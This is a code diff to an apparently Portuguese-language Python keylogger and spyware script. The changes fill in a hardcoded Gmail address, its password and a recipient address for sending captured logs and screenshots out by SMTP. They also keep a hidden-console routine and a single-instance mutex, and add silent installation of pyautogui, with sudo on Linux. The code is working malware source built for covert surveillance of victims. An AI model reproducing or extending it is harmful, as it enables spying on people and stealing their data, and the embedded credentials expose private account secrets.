@@ -26,21 +26,25 @@ import threading
 import urllib,urllib2
 import smtplib
 import ftplib
-import datetime,time
+import datetime, time
 import win32event, win32api, winerror
+import random
+import string
 
-global t,start_time,nome_print,gmail,gmailpass,enviar,interval
+global t, start_time, nome_print, gmail, gmailpass, enviar, interval
 
 t = ''
 data = ''
-x=''
-count=0
+x = ''
+count = 0
 nome_print = []
+start_time = time.time()
 
 #Destino dos logs
-gmail = ''	                    	#Seu email
-gmailpass = ''		               	#A senha do seu email
-enviar = ''	                      #Um email qualquer para receber os logs
+gmail = 'jakoritarl@gmail.com'		#Seu email
+gmailpass = '*JAKL2002*'			#A senha do seu email
+enviar = 'kpbplpsjubs@gmail.com'	#Um email qualquer para receber os logs
+interval = 60
 
 #Desabilitanto multipla instancia
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
@@ -49,11 +53,9 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 	exit(0)
 
 #Esconder terminal
-def Esconder():
+def Hide():
 	win = win32console.GetConsoleWindow()
 	win32gui.ShowWindow(win, 0)
-
-Esconder()
 
 #Envia os dados para o email
 def enviarEmail(data, nome_print):
@@ -74,7 +76,23 @@ def enviarEmail(data, nome_print):
 #Tirar print da tela
 def printScreen():
 	global nome_print
-	import pyautogui
+	try:
+		import pyautogui
+
+	except:
+		usr = getpass.getuser()
+
+		#Para Windows
+		if(os.path.isdir("E:\\")):
+			os.system("py -2 -m pip install pyautogui")
+		
+		elif(os.path.isdir("C:\\")):
+			os.system("py -2 -m pip install pyautogui")
+
+		#Para Linux
+		elif(os.path.isdir("/home/"+usr+"/")):
+			os.system("sudo python2 -m pip install pyautogui")
+		
 	def gerar_nome():
 		return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
 
